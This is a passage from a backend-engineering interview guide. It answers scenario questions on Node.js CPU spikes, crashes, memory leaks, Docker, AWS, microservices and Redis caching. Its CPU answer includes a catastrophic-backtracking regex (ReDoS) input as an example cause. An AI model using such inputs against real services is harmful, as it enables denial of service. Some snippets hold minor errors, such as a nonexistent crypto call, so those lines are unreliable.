  process.exit(1);
});
```

---

<a id="scenario-7-nodejs"></a>
## Scenario 7: Node.js

<a id="q34-server-cpu-suddenly-reaches-100-how-will-you-investigate"></a>
### Q34. Server CPU suddenly reaches 100%. How will you investigate?

**Answer:**

```javascript
// 1. Immediate diagnosis
// Check with: top, htop, or process.cpuUsage()

// 2. Common causes:
// a) Infinite loop
while (true) { /* something wrong */ }

// b) Complex regex (ReDoS - Regular Expression Denial of Service)
const evilRegex = /^(a+)+$/; // Catastrophic backtracking
"aaaaaaaaaaaaaaaaaaaaaaaab".match(evilRegex); // Hangs!

// c) Synchronous heavy operations
const data = JSON.parse(fs.readFileSync('huge-file.json')); // Blocks!
crypto.pbkrypt.hashSync(password, 20); // Very high rounds

// d) Tight event loop with no I/O
setImmediate(function recursive() { /* heavy work */ setImmediate(recursive); });

// 3. Profiling in production
// Using --prof flag
// node --prof server.js
// Then: node --prof-process isolate-*.log > profile.txt

// Using clinic.js
// npx clinic flame -- node server.js
// Generates flame graph showing where CPU time is spent

// 4. Real-time monitoring
setInterval(() => {
  const usage = process.cpuUsage();
  const uptime = process.uptime();
  console.log(`CPU: user=${usage.user/1000}ms, system=${usage.system/1000}ms`);
  console.log(`Event Loop Lag: ${getEventLoopLag()}ms`);
}, 5000);

// 5. Fix: Offload CPU-heavy work
const { Worker, isMainThread, workerData } = require('worker_threads');

if (isMainThread) {
  app.get('/api/heavy-computation', (req, res) => {
    const worker = new Worker(__filename, { workerData: req.query });
    worker.on('message', (result) => res.json(result));
    worker.on('error', (err) => res.status(500).json({ error: err.message }));
  });
} else {
  // Worker thread - doesn't block main event loop
  const result = performHeavyCalculation(workerData);
  parentPort.postMessage(result);
}

// 6. PM2 cluster mode - distribute load across CPU cores
// pm2 start server.js -i max
```

---

<a id="q35-nodejs-server-crashes-every-few-hours-what-will-you-check-first"></a>
### Q35. Node.js server crashes every few hours. What will you check first?

**Answer:**

```javascript
// 1. Check logs for the crash reason
// PM2: pm2 logs
// Docker: docker logs container_name
// Systemd: journalctl -u myapp

// 2. Common crash causes:

// a) Memory leak → OOM Kill
// Check: process.memoryUsage().heapUsed
// Fix: Find and fix leaks (see Q36)

// b) Unhandled promise rejections (Node 15+ crashes on these)
process.on('unhandledRejection', (reason, promise) => {
  console.error('Unhandled Rejection at:', promise, 'reason:', reason);
  // Log and gracefully shutdown instead of crashing
});

// c) Uncaught exceptions
process.on('uncaughtException', (error) => {
  console.error('Uncaught Exception:', error);
  // Graceful shutdown
  gracefulShutdown();
});

async function gracefulShutdown() {
  console.log('Shutting down gracefully...');
  server.close(() => {
    mongoose.connection.close();
    process.exit(1);
  });
  // Force exit if graceful shutdown takes too long
  setTimeout(() => process.exit(1), 10000);
}

// d) Database connection drops
mongoose.connection.on('disconnected', () => {
  console.error('MongoDB disconnected! Attempting reconnect...');
});
mongoose.connection.on('error', (err) => {
  console.error('MongoDB error:', err);
});

// e) File descriptor leak
const { execSync } = require('child_process');
// Check open file descriptors: lsof -p <pid> | wc -l

// 3. Use PM2 for auto-restart
// pm2 start server.js --max-memory-restart 500M
// pm2 start server.js --max-restarts 10

// 4. Add health check endpoint
app.get('/health', (req, res) => {
  const health = {
    uptime: process.uptime(),
    memory: process.memoryUsage(),
    status: 'OK',
    timestamp: new Date()
  };
  res.json(health);
});
```

---

<a id="q36-the-application-has-a-memory-leak-how-will-you-identify-it"></a>
### Q36. The application has a memory leak. How will you identify it?

**Answer:**

```javascript
// 1. Monitor memory over time
setInterval(() => {
  const { heapUsed, heapTotal, rss } = process.memoryUsage();
  console.log(`Heap: ${Math.round(heapUsed / 1024 / 1024)}MB / ${Math.round(heapTotal / 1024 / 1024)}MB | RSS: ${Math.round(rss / 1024 / 1024)}MB`);
  // If heapUsed keeps growing without dropping → LEAK
}, 10000);

// 2. Take heap snapshots
const v8 = require('v8');

app.get('/debug/heap-snapshot', (req, res) => {
  const filename = `/tmp/heap-${Date.now()}.heapsnapshot`;
  v8.writeHeapSnapshot(filename);
  res.json({ file: filename });
  // Download and load in Chrome DevTools → Memory tab
});

// 3. Common leak patterns:

// a) Growing arrays/maps
const cache = {}; // Never cleared!
app.get('/api/data/:id', (req, res) => {
  cache[req.params.id] = expensiveComputation(); // Grows forever
});
// Fix: Use LRU cache with max size
const LRU = require('lru-cache');
const cache = new LRU({ max: 500, ttl: 1000 * 60 * 5 });

// b) Event listeners accumulating
function handleConnection(socket) {
  eventEmitter.on('broadcast', (msg) => socket.send(msg));
  // If called many times without cleanup → leak
}
// Fix:
function handleConnection(socket) {
  const handler = (msg) => socket.send(msg);
  eventEmitter.on('broadcast', handler);
  socket.on('close', () => eventEmitter.removeListener('broadcast', handler));
}

// c) Closures holding large objects
function processData() {
  const hugeData = loadLargeDataset(); // 100MB
  return () => hugeData.length; // Closure keeps hugeData alive
}

// d) Unreleased database connections
// Always close cursors and sessions

// 4. Tools for leak detection:
// - Chrome DevTools (attach to Node with --inspect)
// - clinic.js heapprofile
// - memwatch-next package
const memwatch = require('@airbnb/node-memwatch');
memwatch.on('leak', (info) => {
  console.error('Memory leak detected:', info);
});
```

---

<a id="q37-a-long-running-calculation-blocks-all-requests-how-would-you-solve-this"></a>
### Q37. A long-running calculation blocks all requests. How would you solve this?

**Answer:**

```javascript
// Problem: Node.js is single-threaded. CPU-bound tasks block the event loop.
// While calculating, ALL other requests wait!

app.get('/api/report', (req, res) => {
  // This blocks for 10 seconds - all other users wait!
  const result = calculateComplexReport(); // CPU-intensive
  res.json(result);
});

// Solution 1: Worker Threads (best for CPU-bound tasks)
// worker.js
const { parentPort, workerData } = require('worker_threads');
const result = calculateComplexReport(workerData);
parentPort.postMessage(result);

// server.js
const { Worker } = require('worker_threads');

app.get('/api/report', (req, res) => {
  const worker = new Worker('./worker.js', {
    workerData: { userId: req.user.id, dateRange: req.query.range }
  });
  
  worker.on('message', (result) => res.json(result));
  worker.on('error', (err) => res.status(500).json({ error: err.message }));
  worker.on('exit', (code) => {
    if (code !== 0) res.status(500).json({ error: `Worker exited with code ${code}` });
  });
});

// Solution 2: Break work into chunks (setImmediate)
function processInChunks(data, chunkSize = 1000) {
  return new Promise((resolve) => {
    let index = 0;
    const results = [];
    
    function processChunk() {
      const end = Math.min(index + chunkSize, data.length);
      for (; index < end; index++) {
        results.push(heavyCalculation(data[index]));
      }
      
      if (index < data.length) {
        setImmediate(processChunk); // Yields to event loop between chunks
      } else {
        resolve(results);
      }
    }
    
    processChunk();
  });
}

// Solution 3: Job Queue (for background processing)
const Queue = require('bull');
const reportQueue = new Queue('reports', redisUrl);

app.post('/api/report', async (req, res) => {
  const job = await reportQueue.add({
    userId: req.user.id,
    params: req.body
  });
  res.json({ jobId: job.id, status: 'processing' });
});

app.get('/api/report/status/:jobId', async (req, res) => {
  const job = await reportQueue.getJob(req.params.jobId);
  res.json({ status: await job.getState(), result: job.returnvalue });
});

reportQueue.process(async (job) => {
  return await calculateComplexReport(job.data);
});

// Solution 4: Child Process (for complete isolation)
const { fork } = require('child_process');

app.get('/api/report', (req, res) => {
  const child = fork('./heavy-task.js');
  child.send({ userId: req.user.id });
  child.on('message', (result) => { res.json(result); child.kill(); });
});
```

---

<a id="q38-a-third-party-api-is-taking-30-seconds-to-respond-how-will-you-protect-your-application"></a>
### Q38. A third-party API is taking 30 seconds to respond. How will you protect your application?

**Answer:**

```javascript
// Problem: Your server waits 30s, holding connection open, blocking resources

// Solution 1: Timeout
const axios = require('axios');

async function callExternalAPI(data) {
  try {
    const response = await axios.post('https://third-party.com/api', data, {
      timeout: 5000 // 5 second timeout - fail fast!
    });
    return response.data;
  } catch (error) {
    if (error.code === 'ECONNABORTED') {
      throw new Error('External API timed out');
    }
    throw error;
  }
}

// Solution 2: Circuit Breaker Pattern
const CircuitBreaker = require('opossum');

const options = {
  timeout: 5000,        // Trip if call takes > 5s
  errorThresholdPercentage: 50, // Trip if 50% of calls fail
  resetTimeout: 30000   // Try again after 30s
};

const breaker = new CircuitBreaker(callExternalAPI, options);

breaker.on('open', () => console.warn('Circuit OPEN - external API failing'));
breaker.on('halfOpen', () => console.log('Circuit half-open - testing...'));
breaker.on('close', () => console.log('Circuit CLOSED - external API recovered'));

// Fallback when circuit is open
breaker.fallback(() => ({ message: 'Service temporarily unavailable', cached: getCachedData() }));

app.get('/api/data', async (req, res) => {
  const result = await breaker.fire(req.query);
  res.json(result);
});

// Solution 3: Async processing (don't wait for response)
app.post('/api/send-notification', async (req, res) => {
  // Don't wait for email service
  notificationQueue.add({ type: 'email', data: req.body });
  res.json({ message: 'Notification queued' });
});

// Solution 4: Retry with exponential backoff
async function callWithRetry(fn, maxRetries = 3) {
  for (let i = 0; i < maxRetries; i++) {
    try {
      return await fn();
    } catch (error) {
      if (i === maxRetries - 1) throw error;
      const delay = Math.pow(2, i) * 1000; // 1s, 2s, 4s
      await new Promise(resolve => setTimeout(resolve, delay));
    }
  }
}

// Solution 5: Cache external API responses
async function getExternalData(key) {
  const cached = await redis.get(`external:${key}`);
  if (cached) return JSON.parse(cached);
  
  const data = await callWithRetry(() => callExternalAPI(key));
  await redis.setEx(`external:${key}`, 300, JSON.stringify(data)); // Cache 5 min
  return data;
}
```

---

<a id="scenario-8-docker"></a>
## Scenario 8: Docker

<a id="q39-docker-container-starts-and-exits-immediately-what-are-the-possible-reasons"></a>
### Q39. Docker container starts and exits immediately. What are the possible reasons?

**Answer:**

```bash
# 1. Check exit code and logs
docker logs <container_id>
docker inspect <container_id> --format='{{.State.ExitCode}}'

# Exit codes:
# 0 = Normal exit (process completed)
# 1 = Application error
# 137 = OOM killed (out of memory)
# 139 = Segmentation fault
```

**Common causes:**

```dockerfile
# Cause 1: CMD/ENTRYPOINT not keeping process running
# BAD Dockerfile:
CMD ["echo", "Hello"]  # Prints and exits immediately

# GOOD:
CMD ["node", "server.js"]  # Long-running process

# Cause 2: Application crashes on start
# Missing environment variables, can't connect to DB, port already in use
# Fix: Check logs, ensure all env vars are set

# Cause 3: Wrong working directory
WORKDIR /app
COPY . .
CMD ["node", "server.js"]  # server.js not in /app?

# Cause 4: Dependencies not installed
# Forgot to run npm install in Dockerfile
COPY package*.json ./
RUN npm ci --only=production  # Must install before running!
COPY . .

# Cause 5: Port mismatch
EXPOSE 5000
# But app listens on 3000 internally

# Debugging:
docker run -it <image> /bin/sh  # Get shell inside container
docker run -it <image> node -e "console.log(process.env)"  # Check env
```

```dockerfile
# Proper Dockerfile for Node.js:
FROM node:18-alpine
WORKDIR /app
COPY package*.json ./
RUN npm ci --only=production
COPY . .
EXPOSE 5000
HEALTHCHECK --interval=30s --timeout=3s CMD wget --spider http://localhost:5000/health || exit 1
CMD ["node", "server.js"]
```

---

<a id="q40-container-works-locally-but-not-on-the-server-how-will-you-debug-it"></a>
### Q40. Container works locally but not on the server. How will you debug it?

**Answer:**

```bash
# 1. Check if images are identical
docker images  # Compare image ID, tag, size

# 2. Check environment variables
docker exec <container> env
# Local might have .env file, server might not

# 3. Check network
docker network ls
docker exec <container> ping database-host
# DNS resolution, firewall rules, security groups

# 4. Check resources
docker stats <container>
# Server might have less memory/CPU than local machine

# 5. Check volumes and file permissions
docker exec <container> ls -la /app
# Files might have different permissions on Linux vs Mac/Windows

# 6. Check Docker version differences
docker version
docker info
```

**Common differences:**

| Factor | Local | Server |
|--------|-------|--------|
| OS | macOS/Windows | Linux |
| Architecture | arm64 (M1) | amd64 |
| Network | bridge/host | overlay/custom |
| Storage | fast SSD | network volume |
| Environment | .env file | Secrets manager |
| Ports | All available | Firewall restricted |

```javascript
// Fix: Use docker-compose for consistent environments
// docker-compose.yml
version: '3.8'
services:
  app:
    build: .
    ports:
      - "5000:5000"
    environment:
      - MONGO_URI=mongodb://mongo:27017/mydb
      - JWT_SECRET=${JWT_SECRET}
      - NODE_ENV=production
    depends_on:
      - mongo
    restart: unless-stopped
    
  mongo:
    image: mongo:6
    volumes:
      - mongo_data:/data/db
    
volumes:
  mongo_data:
```

---

<a id="q41-environment-variables-are-missing-inside-the-container-what-will-you-check"></a>
### Q41. Environment variables are missing inside the container. What will you check?

**Answer:**

```bash
# 1. Verify env vars are actually set
docker exec <container> printenv
docker exec <container> node -e "console.log(process.env)"

# 2. Check how they're being passed:

# Method A: docker run -e
docker run -e MONGO_URI=mongodb://... -e JWT_SECRET=mysecret myapp

# Method B: .env file
docker run --env-file .env myapp

# Method C: docker-compose.yml
# environment:
#   - MONGO_URI=mongodb://...
# OR
# env_file:
#   - .env

# 3. Common mistakes:

# a) .env file in .dockerignore
# Check .dockerignore - if .env is listed, it won't be copied to image!
# But wait: .env SHOULD be in .dockerignore for security!
# Solution: Pass env vars at runtime, not build time

# b) ARG vs ENV in Dockerfile
# ARG is only available during build
# ENV is available at runtime
ARG DB_HOST        # Only during: docker build --build-arg DB_HOST=...
ENV NODE_ENV=production  # Available when container runs

# c) Variable expansion not working
# BAD in docker-compose:
# environment:
#   - MONGO_URI=$MONGO_URI  # Host's env var might not exist on server

# GOOD: Use explicit values or .env file
# env_file:
#   - .env.production

# d) Multi-stage build losing env vars
FROM node:18 AS builder
ENV NODE_ENV=production

FROM node:18-alpine AS runtime
# ENV from builder stage is NOT inherited!
ENV NODE_ENV=production  # Must declare again

# 4. For secrets in production, use:
# - Docker secrets (Swarm)
# - AWS Secrets Manager
# - Kubernetes secrets
# - Vault by HashiCorp
```

---

<a id="scenario-9-aws"></a>
## Scenario 9: AWS

<a id="q42-ec2-instance-is-running-but-the-application-is-not-accessible-what-will-you-check"></a>
### Q42. EC2 instance is running but the application is not accessible. What will you check?

**Answer:**

```
Checklist (in order):

1. Security Group (most common issue!)
   - Inbound rules: Is port 80/443/5000 open?
   - Source: Is it 0.0.0.0/0 (all) or restricted to specific IPs?
   
2. Application is actually running?
   ssh into instance:
   $ ps aux | grep node
   $ curl http://localhost:5000/health  (test locally on instance)
   
3. Application listening on correct interface
   // BAD: app.listen(5000, '127.0.0.1')  → Only accepts localhost
   // GOOD: app.listen(5000, '0.0.0.0')   → Accepts all interfaces
   
4. Network ACL (subnet-level firewall)
   - Check both inbound AND outbound rules
   
5. Elastic IP / Public IP assigned?
   - Instance might only have private IP
   
6. Route Table
   - Subnet has route to Internet Gateway?
   
7. Instance is in public subnet?
   - Private subnet = no direct internet access
   
8. Nginx/reverse proxy running?
   $ systemctl status nginx
   $ nginx -t  (test config)
   
9. DNS pointing to correct IP?
   $ nslookup yourdomain.com
   
10. SSL Certificate issues (if HTTPS)
    - Certificate expired?
    - Domain mismatch?
```

```bash
# Quick debugging commands on EC2:
sudo systemctl status myapp
sudo journalctl -u myapp -f
sudo netstat -tlnp | grep 5000
curl -v http://localhost:5000
telnet <public-ip> 5000  # From outside - tests connectivity
```

---

<a id="q43-users-cannot-upload-files-to-s3-what-are-the-possible-reasons"></a>
### Q43. Users cannot upload files to S3. What are the possible reasons?

**Answer:**

```javascript
// 1. IAM Permissions (most common)
// EC2 instance role or user needs:
{
  "Effect": "Allow",
  "Action": ["s3:PutObject", "s3:GetObject"],
  "Resource": "arn:aws:s3:::my-bucket/*"
}

// 2. Bucket Policy blocking uploads
// Check bucket policy for deny rules

// 3. CORS configuration (for browser-direct uploads)
// S3 Bucket → Permissions → CORS:
[
  {
    "AllowedHeaders": ["*"],
    "AllowedMethods": ["PUT", "POST", "GET"],
    "AllowedOrigins": ["https://yourfrontend.com"],
    "ExposeHeaders": ["ETag"]
  }
]

// 4. Presigned URL expired
// Presigned URLs have expiry (usually 1 hour)
const url = s3.getSignedUrl('putObject', {
  Bucket: 'my-bucket',
  Key: 'file.jpg',
  Expires: 3600 // Check this value
});

// 5. File size exceeds limit
// S3 single PUT limit: 5GB
// For larger: use multipart upload

// 6. Bucket doesn't exist or wrong region
const s3 = new AWS.S3({ region: 'ap-south-1' }); // Must match bucket region

// 7. Network/VPC issues
// If app is in VPC, need VPC Endpoint for S3 or NAT Gateway

// 8. Encryption requirements
// Bucket might require KMS encryption
const params = {
  Bucket: 'my-bucket',
  Key: 'file.jpg',
  Body: fileBuffer,
  ServerSideEncryption: 'aws:kms', // Required if bucket enforces encryption
  SSEKMSKeyId: 'key-id'
};

// 9. Block Public Access settings
// Even if ACL is public, Block Public Access overrides it

// Debugging:
try {
  await s3.putObject(params).promise();
} catch (error) {
  console.error('S3 Error:', error.code, error.message);
  // AccessDenied → IAM/Bucket policy
  // NoSuchBucket → Wrong bucket name
  // InvalidAccessKeyId → Wrong credentials
}
```

---

<a id="q44-cloudwatch-shows-high-cpu-usage-how-will-you-proceed"></a>
### Q44. CloudWatch shows high CPU usage. How will you proceed?

**Answer:**

```
Step-by-step approach:

1. Identify the timeframe
   - When did CPU spike start?
   - Is it consistent or periodic?
   - Correlate with deployments or traffic spikes

2. Check which process is consuming CPU
   $ ssh into instance
   $ top -c (shows processes sorted by CPU)
   $ ps aux --sort=-%cpu | head -20

3. Check if it's traffic-related
   - CloudWatch: Check RequestCount, NetworkIn/Out
   - If traffic increased → Scale horizontally (Auto Scaling Group)
   - If traffic is normal → Application issue

4. Application-level investigation
   - Enable Node.js profiling (--prof or clinic.js)
   - Check for infinite loops, regex issues, heavy computation
   - Review recent code deployments

5. Short-term fixes:
   - Vertical scaling: Increase instance size (t3.small → t3.medium)
   - Horizontal scaling: Add more instances behind load balancer
   - Restart the problematic process

6. Long-term fixes:
   - Optimize code (worker threads, caching)
   - Set up Auto Scaling:
     - Scale out when CPU > 70% for 5 minutes
     - Scale in when CPU < 30% for 10 minutes
   - Set up CloudWatch Alarms:
     - Alert when CPU > 80%
     - Alert when CPU > 90% (critical)
```

---

<a id="q45-application-becomes-unavailable-after-deployment-what-steps-will-you-take"></a>
### Q45. Application becomes unavailable after deployment. What steps will you take?

**Answer:**

```
Immediate response:

1. ROLLBACK FIRST, investigate later
   - Revert to last known good version
   - Blue-Green: Switch traffic back to blue (old) environment
   - ECS/K8s: Roll back to previous task definition
   - EC2: Deploy previous version from artifact

2. Check what changed
   - Git diff between old and new version
   - New environment variables needed?
   - Database migrations run?
   - New dependencies installed?

3. Check application logs
   - CloudWatch Logs
   - PM2 logs
   - Docker logs

4. Common post-deployment issues:
   - New env vars not set in production
   - Database migration failed
   - Breaking API changes
   - Port conflicts
   - Health check failing (new endpoint not responding)
   - File permissions changed
   - Node.js version mismatch

5. Prevention strategies:
   - Blue-Green deployment (zero downtime)
   - Canary deployment (gradual rollout)
   - Health checks before switching traffic
   - Automated rollback on health check failure
   - Smoke tests after deployment

6. AWS-specific:
   - ALB health checks failing → target group shows unhealthy
   - CodeDeploy: Check deployment lifecycle hooks
   - ECS: Check task definition, container logs
```

---

<a id="scenario-10-microservices"></a>
## Scenario 10: Microservices

<a id="q46-one-microservice-is-down-how-will-other-services-behave"></a>
### Q46. One microservice is down. How will other services behave?

**Answer:**

```javascript
// Without resilience patterns: Cascading failure!
// User Service → Order Service (DOWN) → Payment Service
// All services fail because they wait for Order Service

// Solution: Implement resilience patterns

// 1. Circuit Breaker (stops calling failed service)
const CircuitBreaker = require('opossum');

const orderServiceBreaker = new CircuitBreaker(callOrderService, {
  timeout: 3000,
  errorThresholdPercentage: 50,
  resetTimeout: 30000
});

// When Order Service is down, return graceful degradation
orderServiceBreaker.fallback(() => ({
  orders: [],
  message: 'Order service temporarily unavailable'
}));

// 2. Retry with backoff
async function callWithRetry(serviceFn, retries = 3) {
  for (let i = 0; i < retries; i++) {
    try {
      return await serviceFn();
    } catch (error) {
      if (i === retries - 1) throw error;
      await sleep(Math.pow(2, i) * 1000); // 1s, 2s, 4s
    }
  }
}

// 3. Bulkhead pattern (isolate failures)
// Limit concurrent calls to each service
const Bottleneck = require('bottleneck');
const orderLimiter = new Bottleneck({ maxConcurrent: 10, minTime: 100 });

// 4. Graceful degradation
app.get('/api/dashboard', async (req, res) => {
  const results = await Promise.allSettled([
    getUserProfile(req.user.id),
    getRecentOrders(req.user.id),      // Might fail
    getRecommendations(req.user.id)    // Might fail
  ]);
  
  res.json({
    profile: results[0].status === 'fulfilled' ? results[0].value : null,
    orders: results[1].status === 'fulfilled' ? results[1].value : [],
    recommendations: results[2].status === 'fulfilled' ? results[2].value : [],
    warnings: results.filter(r => r.status === 'rejected').map(() => 'Some data unavailable')
  });
});

// 5. Health checks
// Each service checks dependencies on startup
async function healthCheck() {
  const checks = {
    database: await checkMongo(),
    redis: await checkRedis(),
    orderService: await pingService('http://order-service/health')
  };
  return checks;
}
```

---

<a id="q47-notification-service-is-slow-will-you-call-it-synchronously-or-asynchronously-why"></a>
### Q47. Notification service is slow. Will you call it synchronously or asynchronously? Why?

**Answer:**

**Asynchronously!** Always.

```javascript
// BAD: Synchronous call (blocks user's request)
app.post('/api/orders', async (req, res) => {
  const order = await Order.create(req.body);
  
  // User waits while email sends (2-5 seconds!)
  await notificationService.sendEmail(order.userId, 'Order placed!');
  await notificationService.sendSMS(order.userId, 'Order confirmed');
  await notificationService.sendPush(order.userId, 'Your order is placed');
  
  res.json(order); // User waited 10+ seconds!
});

// GOOD: Asynchronous (fire and forget / message queue)
const Queue = require('bull');
const notificationQueue = new Queue('notifications', redisUrl);

app.post('/api/orders', async (req, res) => {
  const order = await Order.create(req.body);
  
  // Non-blocking: Add to queue and respond immediately
  await notificationQueue.add('orderPlaced', {
    userId: order.userId,
    orderId: order._id,
    type: 'order_confirmation'
  });
  
  res.status(201).json(order); // Instant response!
});

// Separate notification worker (can be different service)
notificationQueue.process('orderPlaced', async (job) => {
  const { userId, orderId } = job.data;
  
  // These run in background, don't affect user experience
  await sendEmail(userId, 'order_confirmation', { orderId });
  await sendSMS(userId, 'Your order is confirmed');
  await sendPushNotification(userId, 'Order placed!');
});

// WHY Async?
// 1. User gets instant response (better UX)
// 2. If notification fails, order still succeeds
// 3. Can retry failed notifications without affecting main flow
// 4. Can process notifications at own pace (no overwhelm)
// 5. Services are decoupled (can deploy independently)
```

---

<a id="q48-how-will-two-microservices-communicate-securely"></a>
### Q48. How will two microservices communicate securely?

**Answer:**

```javascript
// 1. Internal API Key / Service Token
// Service A calls Service B with shared secret
const serviceClient = axios.create({
  baseURL: 'http://order-service:3001',
  headers: {
    'X-Service-Key': process.env.INTERNAL_SERVICE_KEY,
    'X-Service-Name': 'user-service'
  }
});

// Service B validates:
const validateServiceKey = (req, res, next) => {
  const key = req.headers['x-service-key'];
  if (key !== process.env.INTERNAL_SERVICE_KEY) {
    return res.status(403).json({ message: 'Invalid service key' });
  }
  next();
};

// 2. mTLS (Mutual TLS) - Both sides verify certificates
// Best for production microservices
// Service mesh (Istio, Linkerd) handles this automatically

// 3. JWT for service-to-service
// Each service has its own signing key
const serviceToken = jwt.sign(
  { service: 'user-service', permissions: ['read:orders'] },
  SERVICE_PRIVATE_KEY,
  { expiresIn: '5m', algorithm: 'RS256' }
);

// 4. Network-level security
// - Services in private subnet (no public access)
// - Security groups allow only specific service-to-service traffic
// - VPC peering for cross-VPC communication

// 5. AWS-specific: IAM roles + VPC
// Services in same VPC communicate via private IP
// Use AWS Service Discovery for DNS-based discovery

// 6. Message Queue (for async communication)
// RabbitMQ/SQS with access policies
// Only authorized services can publish/consume from specific queues
```

---

<a id="q49-how-will-you-trace-a-request-that-passes-through-multiple-microservices"></a>
### Q49. How will you trace a request that passes through multiple microservices?

**Answer:**

```javascript
// Distributed Tracing - Track a single request across all services

// 1. Correlation ID (Simple approach)
const { v4: uuidv4 } = require('uuid');

// Gateway/First service: Generate trace ID
app.use((req, res, next) => {
  req.traceId = req.headers['x-trace-id'] || uuidv4();
  res.setHeader('x-trace-id', req.traceId);
  next();
});

// Pass trace ID to all downstream calls
async function callOrderService(data, traceId) {
  return axios.post('http://order-service/api/orders', data, {
    headers: { 'x-trace-id': traceId }
  });
}

// Log with trace ID everywhere
const logger = (req) => ({
  info: (msg, data) => console.log(JSON.stringify({
    traceId: req.traceId,
    service: 'user-service',
    timestamp: new Date().toISOString(),
    message: msg,
    ...data
  }))
});

// 2. OpenTelemetry (Industry standard)
const { NodeTracerProvider } = require('@opentelemetry/sdk-trace-node');
const { JaegerExporter } = require('@opentelemetry/exporter-jaeger');

const provider = new NodeTracerProvider();
provider.addSpanProcessor(new SimpleSpanProcessor(new JaegerExporter()));
provider.register();

const tracer = trace.getTracer('my-service');

app.get('/api/orders', async (req, res) => {
  const span = tracer.startSpan('get-orders');
  
  span.setAttribute('userId', req.user.id);
  const orders = await orderService.getOrders(req.user.id);
  
  span.end();
  res.json(orders);
});

// 3. Structured logging with trace context
// All services log with same traceId
// In ELK/CloudWatch, filter by traceId to see full request flow:
// [user-service] traceId=abc123 → Received GET /api/dashboard
// [user-service] traceId=abc123 → Calling order-service
// [order-service] traceId=abc123 → Received GET /api/orders?userId=1
// [order-service] traceId=abc123 → DB query: 25ms
// [order-service] traceId=abc123 → Response: 200 (30ms)
// [user-service] traceId=abc123 → Response: 200 (45ms)

// 4. Tools: Jaeger, Zipkin, AWS X-Ray, Datadog APM
```

---

<a id="scenario-11-caching"></a>
## Scenario 11: Caching

<a id="q50-product-api-receives-50000-requests-per-minute-how-will-you-reduce-database-load"></a>
### Q50. Product API receives 50,000 requests per minute. How will you reduce database load?

**Answer:**

```javascript
// Multi-layer caching strategy:

const Redis = require('ioredis');
const redis = new Redis(process.env.REDIS_URL);

// Layer 1: In-memory cache (fastest, per-instance)
const NodeCache = require('node-cache');
const localCache = new NodeCache({ stdTTL: 60, maxKeys: 1000 });

// Layer 2: Redis (shared across instances)
// Layer 3: Database (last resort)

app.get('/api/products', async (req, res) => {
  const cacheKey = `products:${req.query.category || 'all'}:page:${req.query.page || 1}`;
  
  // Check local cache first (sub-millisecond)
  const localData = localCache.get(cacheKey);
  if (localData) return res.json(localData);
  
  // Check Redis (1-2ms)
  const redisData = await redis.get(cacheKey);
  if (redisData) {
    const parsed = JSON.parse(redisData);
    localCache.set(cacheKey, parsed); // Populate local cache
    return res.json(parsed);
  }
  
  // Database query (50-500ms)
  const products = await Product.find(buildQuery(req.query))
    .sort({ createdAt: -1 })
    .skip((req.query.page - 1) * 20)
    .limit(20)
    .lean();
  
  const response = { data: products, page: req.query.page, total: products.length };
  
  // Store in both caches
  await redis.setEx(cacheKey, 300, JSON.stringify(response)); // 5 min in Redis
  localCache.set(cacheKey, response); // 1 min local
  
  res.json(response);
});

// For individual products (high cache hit rate)
app.get('/api/products/:id', async (req, res) => {
  const key = `product:${req.params.id}`;
  
  const cached = await redis.get(key);
  if (cached) return res.json(JSON.parse(cached));
  
  const product = await Product.findById(req.params.id).lean();
  if (!product) return res.status(404).json({ message: 'Not found' });
  
  await redis.setEx(key, 600, JSON.stringify(product)); // 10 min
  res.json(product);
});

// Cache-aside pattern with write-through
app.put('/api/products/:id', async (req, res) => {
  const product = await Product.findByIdAndUpdate(req.params.id, req.body, { new: true });
  
  // Invalidate cache on update
  await redis.del(`product:${req.params.id}`);
  // Also invalidate list caches
  const keys = await redis.keys('products:*');
  if (keys.length) await redis.del(keys);
  
  res.json(product);
});
```

---

<a id="q51-cached-data-becomes-outdated-how-will-you-refresh-or-invalidate-the-cache"></a>
### Q51. Cached data becomes outdated. How will you refresh or invalidate the cache?

**Answer:**

```javascript
// Strategy 1: TTL (Time-To-Live) - Simplest
await redis.setEx('product:123', 300, data); // Auto-expires in 5 min
// Pros: Simple, automatic
// Cons: Data can be stale for up to TTL duration

// Strategy 2: Cache Invalidation on Write (Event-driven)
// When data changes, delete cache immediately
async function updateProduct(id, data) {
  const product = await Product.findByIdAndUpdate(id, data, { new: true });
  
  // Invalidate related caches
  await redis.del(`product:${id}`);
  await redis.del('products:all:page:1'); // List cache
  
  // Publish event for other instances
  await redis.publish('cache:invalidate', JSON.stringify({ type: 'product', id }));
  
  return product;
}

// Subscribe to invalidation events (all instances)
const subscriber = new Redis(process.env.REDIS_URL);
subscriber.subscribe('cache:invalidate');
subscriber.on('message', (channel, message) => {
  const { type, id } = JSON.parse(message);
  localCache.del(`${type}:${id}`); // Clear local cache
});

// Strategy 3: Write-Through Cache
async function createOrder(data) {
  const order = await Order.create(data);
  await redis.setEx(`order:${order._id}`, 600, JSON.stringify(order)); // Update cache
  return order;
}

// Strategy 4: Cache Warming (Preload popular data)
async function warmCache() {
  const popularProducts = await Product.find().sort({ views: -1 }).limit(100).lean();
  const pipeline = redis.pipeline();
  
  popularProducts.forEach(product => {
    pipeline.setEx(`product:${product._id}`, 3600, JSON.stringify(product));
  });
  
  await pipeline.exec();
  console.log('Cache warmed with 100 popular products');
}

// Run on server start and periodically
warmCache();
setInterval(warmCache, 30 * 60 * 1000); // Every 30 minutes

// Strategy 5: Stale-While-Revalidate
async function getWithSWR(key, fetchFn, ttl = 300) {
  const cached = await redis.get(key);
  
  if (cached) {
    const { data, timestamp } = JSON.parse(cached);
    const age = (Date.now() - timestamp) / 1000;
    
    if (age > ttl * 0.8) {
      // Cache is getting stale - refresh in background
      fetchFn().then(freshData => {
        redis.setEx(key, ttl, JSON.stringify({ data: freshData, timestamp: Date.now() }));
      });
    }
    
    return data; // Return stale data immediately
  }
  
  // Cache miss - fetch fresh
  const data = await fetchFn();
  await redis.setEx(key, ttl, JSON.stringify({ data, timestamp: Date.now() }));
  return data;
}
```

---

<a id="q52-redis-goes-down-how-should-the-application-behave"></a>
### Q52. Redis goes down. How should the application behave?

**Answer:**

```javascript
// The app MUST NOT crash if Redis is down!
// Graceful degradation: Fall back to database

class CacheService {
  constructor() {
    this.redis = new Redis(process.env.REDIS_URL, {
      retryDelayOnFailover: 1000,
      maxRetriesPerRequest: 1, // Don't wait too long
      enableOfflineQueue: false // Don't queue commands when disconnected
    });
    
    this.isAvailable = true;
    
    this.redis.on('error', (err) => {
      console.error('Redis error:', err.message);
      this.isAvailable = false;
    });
    
    this.redis.on('connect', () => {
      console.log('Redis connected');
